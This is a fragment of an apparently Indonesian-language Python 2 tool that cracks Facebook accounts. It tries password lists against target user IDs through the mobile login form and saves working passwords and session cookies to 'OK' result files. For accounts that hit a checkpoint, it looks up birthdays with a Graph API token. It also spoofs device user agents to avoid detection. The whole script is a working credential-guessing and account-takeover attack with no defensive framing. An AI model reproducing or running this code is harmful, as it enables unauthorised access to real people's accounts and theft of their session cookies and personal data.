    	    ua = open('data/ua.txt', 'r').read()
        except (KeyError, IOError):
        	ua = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
        global ok,cp,loop
        for pw in zona:
            pw = pw.lower()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = bs4.BeautifulSoup(p.text, 'html.parser')
            dtg = ('').join(bs4.re.findall('dtsg":\\{"token":"(.*?)"', p.text))
            data = {}
            for i in b('input'):
            	if i.get('value') is None:
            	    if i.get('name') == 'email':
            	        data.update({"email":user})
                    elif i.get("name")=="pass":
                    	data.update({"pass":pw})
                    else:
                    	data.update({i.get('name'): ''})
                else:
                	data.update({i.get('name'): i.get('value')})
            data.update({'fb_dtsg': dtg, 'm_sess': '', '__user': '0', '__req': 'd',
            '__csr': '', '__a': '', '__dyn': '', 'encpass': ''})
            ses.headers.update({'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&refid=8'})
            po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100', data=data).text
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r %s[ Crack ] %s ◊ %s ◊ %s ' % (H,user,pw,kuki)
                sv = '[ Crack ] %s ◊ %s ◊ %s' % (user,pw,kuki)
                ok.append(sv)
                open('hasil/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    romz = open('token.txt').read()
                    lahir = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,romz)).json()['birthday']
                    month, day, year = lahir.split('/')
                    month = bulan1[month]
                    print '\r %s[ Crack ] %s ◊ %s ◊ %s %s %s ' % (K,user,pw,day,month,year)
                    sv = '[ Crack ] %s ◊ %s ◊ %s %s %s' % (user,pw,day,month,year)
                    cp.append(sv)
                    open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass
                print '\r %s[ Crack ] %s ◊ %s              ' % (K,user,pw)
                sv = '[ Crack ] %s ◊ %s' % (user,pw)
                cp.append(sv)
                open('hasil/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % sv)
                break
                continue

        loop += 1
        print('\r %s[ Crack ] %s/%s OK-:%s - CP-:%s '%(P,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        
# GANTI USER AGENT
def useragent():
	print ("\n%s [%s01%s] Ganti user agents "%(P,K,P))
	print (" [%s02%s] Cek user agents "%(K,K))
	print (" [%s00%s] Kembali "%(M,M))
	uas()
	
def uas():
    u = raw_input('\n%s [?] pilih :%s '%(K,K))
    if u == '':
        print("%s [!] Isi yang benar  "%(M));jeda(2);uas()
    elif u in("1","01"):
    	print (" %s[%s*%s] ketik %sMy user agent%s di browser google chrome\n [%s*%s] untuk gunakan user agent anda sendiri"%(P,K,P,H,P,K,P))
    	print (" [%s*%s] ketik %sdefault%s untuk gunakan user agent bawaan tools"%(K,P,H,P))
    	try:
    	    ua = raw_input("%s [?] user agent : %s"%(P,K))
            if ua in(""):
            	print("%s [!] Isi yang benar kentod "%(M));jeda(2);menu()
            elif ua in("my user agent","My User Agent","MY USER AGENT","My user agent"):
            	jalan("%s [!]  Anda akan di arahkan ke browser "%(H));jeda(2)
            	os.system("am start https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2);useragent()
            elif ua in("default","Default","DEFAULT"):
                ua = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; de-at) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
                open("data/ua.txt","w").write(ua_)
                print ("\n%s [√] menggunakan user agent bawaan"%(H));jeda(2);menu()
            open("data/ua.txt","w").write(ua);jeda(2)
            print ("\n%s [√] berhasil mengganti user agent"%(H));jeda(2);menu()
        except KeyboardInterrupt:
			exit ("\x1b[1;91m [!] Error ") 
    elif u in("2","02"):
        try:
        	ua_ = open('data/ua.txt', 'r').read();jeda(2);print ("%s [%s*%s] user agent anda : %s%s"%(P,K,P,H,ua_));jeda(2);raw_input("\n%s [ %senter%s ] "%(P,K,P));menu()
        except IOError:
        	ua_ = '%s-'%(M)
    elif u in("0","00"):
    	menu()
    else:
        print("%s [!] Isi yang benar  "%(M));jeda(2);uas()

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
 
        
if __name__ == '__main__':
    os.system('git pull')
    folder()
    menu()
